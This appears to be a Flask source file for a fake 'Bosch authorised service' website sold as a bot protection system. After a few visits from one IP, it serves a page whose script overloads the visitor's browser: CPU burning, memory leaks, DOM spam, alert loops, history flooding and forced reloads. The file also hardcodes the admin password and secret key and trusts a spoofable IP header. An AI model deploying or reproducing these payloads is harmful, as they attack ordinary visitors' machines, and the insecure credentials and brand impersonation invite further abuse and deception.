#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SERVO82 Bot Protection System
SSL Destekli Versiyon
"""
from flask import Flask, render_template_string, request, jsonify, session, redirect
import hashlib
import json
import sqlite3
import threading
import time
import random
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'servo82_ultra_secret_key_2025'

# Global değişkenler
visitors = {}
bot_attacks = {}
system_logs = []
settings = {
    'bot_threshold': 3,
    'attack_power': 3,
    'auto_mode': True
}

def log_event(event_type, message):
    """Sistem olaylarını logla"""
    log_entry = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'type': event_type,
        'message': message
    }
    system_logs.append(log_entry)
    
    # Log'ları sınırla (son 100 kayıt)
    if len(system_logs) > 100:
        system_logs.pop(0)
    
    print(f"[{log_entry['timestamp']}] {event_type}: {message}")

# Ana sayfa şablonu (Normal Bosch Servisi)
NORMAL_TEMPLATE = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bosch Yetkili Servisi | Premium Teknik Hizmet</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Roboto', sans-serif;
            line-height: 1.6;
            color: #333;
        }
        
        .header {
            background: linear-gradient(135deg, #0066cc, #004499);
            color: white;
            padding: 1rem 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
        }
        
        .logo {
            font-size: 1.8rem;
            font-weight: 700;
        }
        
        .nav-links {
            display: flex;
            list-style: none;
            gap: 2rem;
        }
        
        .nav-links a {
            color: white;
            text-decoration: none;
            font-weight: 500;
            transition: opacity 0.3s;
        }
        
        .nav-links a:hover {
            opacity: 0.8;
        }
        
        .hero {
            background: linear-gradient(rgba(0,102,204,0.9), rgba(0,68,153,0.9)), url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 600"><rect fill="%23f0f8ff" width="1200" height="600"/><circle fill="%23e1f5fe" cx="200" cy="150" r="80"/><circle fill="%23bbdefb" cx="800" cy="300" r="120"/><circle fill="%23e3f2fd" cx="1000" cy="100" r="60"/></svg>');
            color: white;
            text-align: center;
            padding: 6rem 2rem;
        }
        
        .hero h1 {
            font-size: 3rem;
            margin-bottom: 1rem;
            font-weight: 700;
        }
        
        .hero p {
            font-size: 1.2rem;
            margin-bottom: 2rem;
            opacity: 0.9;
        }
        
        .cta-button {
            display: inline-block;
            background: #ff6b35;
            color: white;
            padding: 1rem 2rem;
            text-decoration: none;
            border-radius: 50px;
            font-weight: 600;
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .cta-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255,107,53,0.4);
        }
        
        .services {
            padding: 5rem 2rem;
            background: #f8f9fa;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .services h2 {
            text-align: center;
            font-size: 2.5rem;
            margin-bottom: 3rem;
            color: #0066cc;
        }
        
        .services-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            margin-top: 3rem;
        }
        
        .service-card {
            background: white;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .service-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
        }
        
        .service-icon {
            font-size: 3rem;
            margin-bottom: 1rem;
        }
        
        .contact {
            background: #0066cc;
            color: white;
            padding: 5rem 2rem;
            text-align: center;
        }
        
        .contact h2 {
            font-size: 2.5rem;
            margin-bottom: 2rem;
        }
        
        .contact-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
            margin-top: 3rem;
        }
        
        .contact-item {
            padding: 1.5rem;
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
        }
        
        .footer {
            background: #1a1a1a;
            color: white;
            text-align: center;
            padding: 2rem;
        }
        
        @media (max-width: 768px) {
            .nav {
                flex-direction: column;
                gap: 1rem;
            }
            
            .nav-links {
                gap: 1rem;
            }
            
            .hero h1 {
                font-size: 2rem;
            }
            
            .hero p {
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <nav class="nav">
            <div class="logo">🔧 BOSCH YETKİLİ SERVİS</div>
            <ul class="nav-links">
                <li><a href="#anasayfa">Ana Sayfa</a></li>
                <li><a href="#hizmetler">Hizmetlerimiz</a></li>
                <li><a href="#iletisim">İletişim</a></li>
                <li><a href="#hakkimizda">Hakkımızda</a></li>
            </ul>
        </nav>
    </header>

    <section class="hero" id="anasayfa">
        <h1>Premium Bosch Teknik Servis</h1>
        <p>25 yıllık deneyim ile tüm Bosch ürünleriniz için profesyonel çözümler</p>
        <a href="#iletisim" class="cta-button">Hemen Randevu Al</a>
    </section>

    <section class="services" id="hizmetler">
        <div class="container">
            <h2>Hizmetlerimiz</h2>
            <div class="services-grid">
                <div class="service-card">
                    <div class="service-icon">🔧</div>
                    <h3>Beyaz Eşya Tamiri</h3>
                    <p>Bulaşık makinesi, çamaşır makinesi, buzdolabı ve tüm beyaz eşya ürünleri için uzman tamir hizmeti.</p>
                </div>
                <div class="service-card">
                    <div class="service-icon">⚡</div>
                    <h3>Elektrikli Aletler</h3>
                    <p>Matkap, testere, taşlama makinesi ve tüm Bosch elektrikli aletlerin bakım ve onarımı.</p>
                </div>
                <div class="service-card">
                    <div class="service-icon">🏠</div>
                    <h3>Ev Aletleri</h3>
                    <p>Kahve makinesi, mikser, süpürge ve tüm küçük ev aletleri için profesyonel servis.</p>
                </div>
                <div class="service-card">
                    <div class="service-icon">🚗</div>
                    <h3>Otomotiv Parçaları</h3>
                    <p>Bosch otomotiv parçaları satışı, montaj ve bakım hizmetleri.</p>
                </div>
                <div class="service-card">
                    <div class="service-icon">🛡️</div>
                    <h3>Garanti Hizmetleri</h3>
                    <p>Resmi Bosch garantisi kapsamında tüm ürünler için ücretsiz servis.</p>
                </div>
                <div class="service-card">
                    <div class="service-icon">🚀</div>
                    <h3>Hızlı Servis</h3>
                    <p>Acil durumlar için 24 saat içinde müdahale garantisi.</p>
                </div>
            </div>
        </div>
    </section>

    <section class="contact" id="iletisim">
        <div class="container">
            <h2>İletişim</h2>
            <p>Uzman ekibimizle iletişime geçin, size en iyi hizmeti verelim.</p>
            <div class="contact-info">
                <div class="contact-item">
                    <h3>📞 Telefon</h3>
                    <p>0212 555 0123<br>0536 789 4567</p>
                </div>
                <div class="contact-item">
                    <h3>📧 E-posta</h3>
                    <p>info@boschservis.com<br>destek@boschservis.com</p>
                </div>
                <div class="contact-item">
                    <h3>📍 Adres</h3>
                    <p>Teknoloji Cad. No:45<br>Şişli / İstanbul</p>
                </div>
                <div class="contact-item">
                    <h3>🕐 Çalışma Saatleri</h3>
                    <p>Pazartesi - Cumartesi<br>09:00 - 18:00</p>
                </div>
            </div>
        </div>
    </section>

    <footer class="footer">
        <p>&copy; 2025 Bosch Yetkili Servisi. Tüm hakları saklıdır.</p>
        <p>Bu site Servo82 Bot Protection ile korunmaktadır.</p>
    </footer>

    <script>
        // Sayfa yükleme animasyonları
        document.addEventListener('DOMContentLoaded', function() {
            const cards = document.querySelectorAll('.service-card');
            cards.forEach((card, index) => {
                card.style.animationDelay = (index * 0.1) + 's';
            });
        });
        
        // Smooth scroll
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                document.querySelector(this.getAttribute('href')).scrollIntoView({
                    behavior: 'smooth'
                });
            });
        });
    </script>
</body>
</html>
'''

# Bot saldırı şablonu
ATTACK_TEMPLATE = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ SERVO82 BOT PROTECTION ACTIVE ⚠️</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: linear-gradient(45deg, #ff0000, #ffff00, #ff0000, #ffff00);
            background-size: 400% 400%;
            animation: gradientShift 0.3s ease-in-out infinite;
            overflow: hidden;
            height: 100vh;
        }
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            color: #000;
            font-weight: bold;
            z-index: 1000;
        }
        .warning {
            font-size: 4rem;
            animation: pulse 0.5s infinite;
            text-shadow: 3px 3px 0px #fff;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        .message {
            font-size: 2rem;
            margin: 2rem 0;
            animation: shake 0.3s infinite;
        }
        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            50% { transform: translateX(5px); }
            75% { transform: translateX(-5px); }
            100% { transform: translateX(0); }
        }
        .glitch {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,0,0,0.1);
            animation: glitch 0.1s infinite;
            pointer-events: none;
        }
        @keyframes glitch {
            0% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="glitch"></div>
    <div class="container">
        <div class="warning">⚠️ BOT TESPİT EDİLDİ ⚠️</div>
        <div class="message">SERVO82 PROTECTION SYSTEM ACTIVE</div>
        <div class="message">IP: {{ user_ip }}</div>
        <div class="message">SISTEM KORUNUYOR...</div>
    </div>
    
    <script>
        // Extreme tarayıcı yavaşlatma
        let intensity = {{ attack_power }};
        
        // CPU yoğun hesaplama
        function cpuBurn() {
            for(let i = 0; i < 1000000 * intensity; i++) {
                Math.random() * Math.random();
            }
        }
        
        // Memory leak
        let memoryLeak = [];
        function memoryBurn() {
            for(let i = 0; i < 10000 * intensity; i++) {
                memoryLeak.push(new Array(1000).fill(Math.random()));
            }
        }
        
        // DOM manipulation
        function domSpam() {
            for(let i = 0; i < 100 * intensity; i++) {
                let div = document.createElement('div');
                div.innerHTML = Math.random().toString();
                document.body.appendChild(div);
            }
        }
        
        // Sürekli çalıştır
        setInterval(() => {
            cpuBurn();
            memoryBurn();
            domSpam();
        }, 10);
        
        // Alert spam
        setTimeout(() => {
            for(let i = 0; i < intensity; i++) {
                setTimeout(() => {
                    alert('SERVO82 BOT PROTECTION - Yetkisiz erişim tespit edildi!');
                }, i * 1000);
            }
        }, 2000);
        
        // Sayfa yeniden yönlendirme döngüsü
        setTimeout(() => {
            window.location.reload();
        }, 10000);
        
        // Browser history manipulation
        setInterval(() => {
            history.pushState({}, '', '#bot-detected-' + Math.random());
        }, 100);
        
        // Console spam
        setInterval(() => {
            console.error('SERVO82 BOT PROTECTION: Unauthorized access detected!');
            console.warn('System security breach attempt blocked!');
        }, 500);
    </script>
</body>
</html>
'''

# Admin panel şablonu
ADMIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SERVO82 Admin Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 2rem;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            padding: 2rem;
            text-align: center;
        }
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 0.5rem;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
            padding: 2rem;
            background: #f8f9fa;
        }
        .stat-card {
            background: white;
            padding: 1.5rem;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            text-align: center;
        }
        .stat-number {
            font-size: 3rem;
            font-weight: bold;
            color: #667eea;
        }
        .stat-label {
            color: #666;
            margin-top: 0.5rem;
        }
        .logs {
            padding: 2rem;
        }
        .logs h2 {
            margin-bottom: 1rem;
            color: #333;
        }
        .log-entry {
            background: #f8f9fa;
            padding: 1rem;
            margin-bottom: 0.5rem;
            border-radius: 5px;
            border-left: 4px solid #667eea;
        }
        .log-timestamp {
            font-size: 0.8rem;
            color: #666;
        }
        .settings {
            padding: 2rem;
            border-top: 1px solid #eee;
        }
        .setting-group {
            margin-bottom: 1.5rem;
        }
        .setting-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
        }
        .setting-group input {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 1rem;
        }
        .btn {
            background: #667eea;
            color: white;
            padding: 0.8rem 2rem;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #5a6fd8;
        }
        .alert {
            padding: 1rem;
            margin-bottom: 1rem;
            border-radius: 5px;
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ SERVO82 BOT PROTECTION</h1>
            <p>Advanced Security Management Panel</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{{ total_visitors }}</div>
                <div class="stat-label">Toplam Ziyaretçi</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{{ bot_count }}</div>
                <div class="stat-label">Bot Saldırısı</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{{ settings.bot_threshold }}</div>
                <div class="stat-label">Bot Eşiği</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{{ settings.attack_power }}</div>
                <div class="stat-label">Saldırı Gücü</div>
            </div>
        </div>
        
        <div class="settings">
            <h2>Sistem Ayarları</h2>
            <form method="POST" action="/admin/settings">
                <div class="setting-group">
                    <label>Bot Tespit Eşiği (kaç ziyaret sonra bot olarak değerlendirilsin):</label>
                    <input type="number" name="bot_threshold" value="{{ settings.bot_threshold }}" min="1" max="10">
                </div>
                <div class="setting-group">
                    <label>Saldırı Gücü (1-5 arası, 5 en yüksek):</label>
                    <input type="number" name="attack_power" value="{{ settings.attack_power }}" min="1" max="5">
                </div>
                <div class="setting-group">
                    <label>
                        <input type="checkbox" name="auto_mode" {{ 'checked' if settings.auto_mode else '' }}>
                        Otomatik Koruma Modu
                    </label>
                </div>
                <button type="submit" class="btn">Ayarları Kaydet</button>
            </form>
        </div>
        
        <div class="logs">
            <h2>Son Sistem Logları</h2>
            {% for log in recent_logs %}
            <div class="log-entry">
                <div class="log-timestamp">{{ log.timestamp }}</div>
                <div><strong>{{ log.type }}:</strong> {{ log.message }}</div>
            </div>
            {% endfor %}
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    """Ana sayfa - bot tespiti burada yapılıyor"""
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '')
    
    # Ziyaretçi takibi
    if user_ip not in visitors:
        visitors[user_ip] = {
            'count': 0,
            'first_visit': datetime.now(),
            'user_agent': user_agent,
            'is_bot': False
        }
        log_event('NEW_VISITOR', f'Yeni ziyaretçi: {user_ip}')
    
    visitors[user_ip]['count'] += 1
    visit_count = visitors[user_ip]['count']
    
    log_event('PAGE_VISIT', f'IP: {user_ip}, Ziyaret: {visit_count}')
    
    # Bot tespiti
    if visit_count >= settings['bot_threshold'] and settings['auto_mode']:
        visitors[user_ip]['is_bot'] = True
        
        if user_ip not in bot_attacks:
            bot_attacks[user_ip] = {
                'start_time': datetime.now(),
                'attack_count': 0
            }
        
        bot_attacks[user_ip]['attack_count'] += 1
        
        log_event('BOT_DETECTED', f'Bot tespit edildi: {user_ip} ({visit_count} ziyaret)')
        
        return render_template_string(ATTACK_TEMPLATE, 
                                    user_ip=user_ip, 
                                    attack_power=settings['attack_power'])
    
    # Normal ziyaretçi
    return render_template_string(NORMAL_TEMPLATE)

@app.route('/admin')
def admin_login():
    """Admin paneli giriş sayfası"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>SERVO82 Admin Login</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                background: linear-gradient(135deg, #667eea, #764ba2);
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                margin: 0;
            }
            .login-form {
                background: white;
                padding: 3rem;
                border-radius: 15px;
                box-shadow: 0 20px 40px rgba(0,0,0,0.1);
                text-align: center;
            }
            .login-form h1 {
                color: #333;
                margin-bottom: 2rem;
            }
            .login-form input {
                width: 100%;
                padding: 1rem;
                margin: 0.5rem 0;
                border: 1px solid #ddd;
                border-radius: 5px;
                font-size: 1rem;
            }
            .login-form button {
                width: 100%;
                padding: 1rem;
                background: #667eea;
                color: white;
                border: none;
                border-radius: 5px;
                font-size: 1rem;
                cursor: pointer;
                margin-top: 1rem;
            }
            .login-form button:hover {
                background: #5a6fd8;
            }
        </style>
    </head>
    <body>
        <form class="login-form" method="POST" action="/admin/login">
            <h1>🛡️ SERVO82 Admin</h1>
            <input type="password" name="password" placeholder="Admin Şifresi" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </body>
    </html>
    '''

@app.route('/admin/login', methods=['POST'])
def admin_login_post():
    """Admin giriş işlemi"""
    password = request.form.get('password')
    
    if password == 'servo82':
        session['admin'] = True
        log_event('ADMIN_LOGIN', f'Admin paneline giriş yapıldı: {request.remote_addr}')
        return redirect('/admin/dashboard')
    else:
        log_event('ADMIN_LOGIN_FAIL', f'Başarısız admin girişi: {request.remote_addr}')
        return redirect('/admin')

@app.route('/admin/dashboard')
def admin_dashboard():
    """Admin paneli ana sayfası"""
    if not session.get('admin'):
        return redirect('/admin')
    
    # İstatistikler
    total_visitors = len(visitors)
    bot_count = len(bot_attacks)
    recent_logs = system_logs[-10:]  # Son 10 log
    
    return render_template_string(ADMIN_TEMPLATE,
                                total_visitors=total_visitors,
                                bot_count=bot_count,
                                settings=settings,
                                recent_logs=recent_logs)

@app.route('/admin/settings', methods=['POST'])
def admin_settings():
    """Admin ayarları güncelleme"""
    if not session.get('admin'):
        return redirect('/admin')
    
    settings['bot_threshold'] = int(request.form.get('bot_threshold', 3))
    settings['attack_power'] = int(request.form.get('attack_power', 3))
    settings['auto_mode'] = bool(request.form.get('auto_mode'))
    
    log_event('SETTINGS_UPDATE', f'Ayarlar güncellendi: threshold={settings["bot_threshold"]}, power={settings["attack_power"]}, auto={settings["auto_mode"]}')
    
    return redirect('/admin/dashboard')

@app.route('/admin/api/stats')
def admin_api_stats():
    """Admin API - anlık istatistikler"""
    if not session.get('admin'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    return jsonify({
        'total_visitors': len(visitors),
        'bot_attacks': len(bot_attacks),
        'recent_visitors': list(visitors.keys())[-5:],
        'system_status': 'active',
        'uptime': time.time()
    })

@app.route('/robots.txt')
def robots():
    """Robots.txt - botları kandırmak için"""
    return '''User-agent: *
Disallow: /admin
Disallow: /api
Allow: /

# Servo82 Bot Protection Active
Crawl-delay: 1'''

@app.route('/sitemap.xml')
def sitemap():
    """Sitemap - SEO için"""
    return '''<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
    <url>
        <loc>https://servo82-bot-protection.onrender.com/</loc>
        <lastmod>2025-06-20</lastmod>
        <changefreq>daily</changefreq>
        <priority>1.0</priority>
    </url>
</urlset>''', 200, {'Content-Type': 'application/xml'}

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'service': 'servo82-bot-protection',
        'version': '2.0',
        'timestamp': datetime.now().isoformat()
    })

@app.errorhandler(404)
def not_found(error):
    """404 hata sayfası"""
    log_event('404_ERROR', f'Sayfa bulunamadı: {request.url} - IP: {request.remote_addr}')
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Sayfa Bulunamadı</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                text-align: center; 
                padding: 5rem;
                background: linear-gradient(135deg, #667eea, #764ba2);
                color: white;
                min-height: 100vh;
                margin: 0;
                display: flex;
                flex-direction: column;
                justify-content: center;
            }
            h1 { font-size: 4rem; margin-bottom: 1rem; }
            p { font-size: 1.2rem; }
            a { color: #fff; text-decoration: underline; }
        </style>
    </head>
    <body>
        <h1>404</h1>
        <p>Aradığınız sayfa bulunamadı.</p>
        <p><a href="/">Ana sayfaya dön</a></p>
        <p style="margin-top: 2rem; font-size: 0.9rem; opacity: 0.7;">
            Servo82 Bot Protection ile korunmaktadır.
        </p>
    </body>
    </html>
    ''', 404

if __name__ == '__main__':
    log_event('SYSTEM_START', 'Servo82 Bot Protection System başlatıldı')
    
    # Render için port ayarı
    port = int(os.environ.get('PORT', 10000))
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        threaded=True
    )